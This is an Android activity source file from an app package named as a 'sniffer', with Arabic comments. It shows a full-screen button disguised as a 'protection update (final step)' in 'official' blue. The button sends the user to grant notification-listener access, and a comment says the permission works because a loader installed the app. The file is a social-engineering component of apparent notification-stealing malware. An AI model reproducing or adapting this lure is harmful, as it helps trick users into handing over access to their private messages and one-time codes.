package com.v8.global.sniffer;

import android.content.Intent;
import android.os.Bundle;
import android.provider.Settings;
import android.view.View;
import android.widget.Button;
import android.graphics.Color;
import androidx.appcompat.app.AppCompatActivity;

public class MainActivity extends AppCompatActivity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // إنشاء زر برمجياً حتى ما تحتاج ملف XML للواجهة
        Button btn = new Button(this);
        btn.setText("تفعيل تحديث الحماية (خطوة أخيرة)");
        btn.setTextSize(20);
        btn.setTextColor(Color.WHITE);
        btn.setBackgroundColor(Color.parseColor("#0088FF")); // لون أزرق رسمي
        
        // المسافة المحيطة بالزر
        btn.setPadding(50, 50, 50, 50);

        btn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                // فتح صفحة صلاحيات الإشعارات (Notification Listener Settings)
                // وبما إن اللوادر ثبت هذا التطبيق، فالزر راح يكون شغال ومو محظور
                Intent intent = new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS);
                startActivity(intent);
            }
        });

        // عرض الزر في منتصف الشاشة
        setContentView(btn);
    }
}
